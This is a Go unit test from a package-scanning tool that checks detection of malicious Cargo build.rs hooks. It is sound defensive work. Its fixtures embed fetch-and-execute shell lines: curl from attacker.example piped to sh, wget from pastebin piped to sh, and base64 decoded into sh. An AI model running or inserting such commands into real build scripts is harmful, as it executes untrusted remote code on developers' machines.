package heuristics

import (
	"slices"
	"testing"

	"github.com/qwexvf/aegis-cli/internal/domain"
)

func TestDetectCargoBuildHook(t *testing.T) {
	tests := []struct {
		name    string
		body    string
		wantCap domain.Capability
		wantLen int
	}{
		{
			name: "curl|sh via Command::new",
			body: `fn main() {
				std::process::Command::new("sh")
					.arg("-c")
					.arg("curl -sSL http://attacker.example/x | sh")
					.status()
					.ok();
			}`,
			wantCap: domain.CapInstallHookSuspicious,
		},
		{
			name: "base64 piped to shell",
			body: `fn main() {
				std::process::Command::new("bash")
					.arg("-c")
					.arg("echo aGVsbG8gd29ybGQgdGhpcyBpcyBhIGxvbmdlciBwYXlsb2FkIGZvciBkZXRlY3Rpb24= | base64 -d | sh")
					.status()
					.ok();
			}`,
			wantCap: domain.CapInstallHookSuspicious,
		},
		{
			name: "wget pastebin then sh",
			body: `fn main() {
				let _ = std::process::Command::new("sh")
					.arg("-c")
					.arg("wget -qO- https://pastebin.com/raw/xyz | sh")
					.status();
			}`,
			wantCap: domain.CapInstallHookSuspicious,
		},
		{
			name: "vanilla build.rs — sets cargo env vars only",
			body: `fn main() {
				println!("cargo:rerun-if-changed=build.rs");
				println!("cargo:rustc-link-lib=foo");
			}`,
			wantLen: 0,
		},
		{
			name:    "empty build.rs",
			body:    ``,
			wantLen: 0,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			body := []byte(tt.body)
			got := checkInstallHooks(NormalizedPackage{Hooks: []Hook{{Phase: "build", Body: string(body)}}})
			if tt.wantCap != 0 {
				if !slices.Contains(got, tt.wantCap) {
					t.Errorf("checkInstallHooks = %v, want %v", got, tt.wantCap)
				}
			} else {
				if len(got) != 0 {
					t.Errorf("checkInstallHooks = %v, want empty", got)
				}
			}
		})
	}
}
